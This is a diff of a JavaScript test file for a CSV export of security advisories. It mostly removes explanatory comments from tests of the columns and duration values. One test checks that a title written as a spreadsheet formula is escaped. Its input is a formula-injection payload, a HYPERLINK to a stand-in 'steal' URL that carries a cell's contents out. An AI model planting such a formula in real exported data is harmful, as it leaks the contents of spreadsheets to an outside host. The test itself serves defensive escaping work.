@@ -8,9 +8,6 @@ const schema = require('../src/common/schema.js');
 const csv = require('../src/done/csv.js');
 
 /**
- * An advisory in the shape the parser produces, carrying only what the export
- * reads.
- *
  * @param {Partial<import('../src/common/parse-detail.js').ParsedDetail>} fields
  * @returns {import('../src/common/parse-detail.js').ParsedDetail}
  */
@@ -44,8 +41,6 @@ function advisory(fields) {
 }
 
 /**
- * One comment in the shape the parser produces.
- *
  * @param {{ author: string, role: string, at: string | null, state?: Record<string, unknown> }} fields
  * @returns {import('../src/common/parse-detail.js').ParsedComment}
  */
@@ -187,18 +182,12 @@ test('the export carries one record per corpus member, under the columns', () =>
       'time_to_first_response_ms,time_to_accept_ms,time_to_close_ms,time_to_publish_ms,' +
       'detail_fetched,observed_at'
   );
-  // Every duration is measured from the report at 14:00 on the 4th, and the
-  // four differ from each other, so a column carrying another one's value reads
-  // wrong here. 14:00 to 14:30 is thirty minutes; to 15:00 is an hour; to the
-  // same time the next day is a day, and to the day after that two.
   assert.strictEqual(
     lines[1],
     'GHSA-aaaa-aaaa-aaaa,Path traversal in the drawer handler,published,high,fixed,' +
       '2026-05-04T14:00:00Z,2026-05,1800000,3600000,86400000,172800000,yes,' +
       '2026-08-27T09:00:00.000Z'
   );
-  // Nothing has read this one, so the timings and the values only an advisory
-  // read carries are blank, and the line still says what the list page knew.
   assert.strictEqual(
     lines[2],
     'GHSA-bbbb-bbbb-bbbb,Only the list page has looked at this one,closed,low,,' +
@@ -216,8 +205,7 @@ test('a field carrying a separator, a quote, or a line break is quoted', () => {
 });
 
 test('a title a reporter wrote as a formula is exported as text', () => {
-  // The reporter names their own advisory, and a spreadsheet opening the file
-  // would otherwise run this.
+  // The reporter controls the title. Spreadsheet formulas must be escaped.
   const title = '=HYPERLINK("https://example.invalid/steal?c="&A1,"click")';
   assert.strictEqual(csv.field(title), `"'${title.replace(/"/g, '""')}"`);
   for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
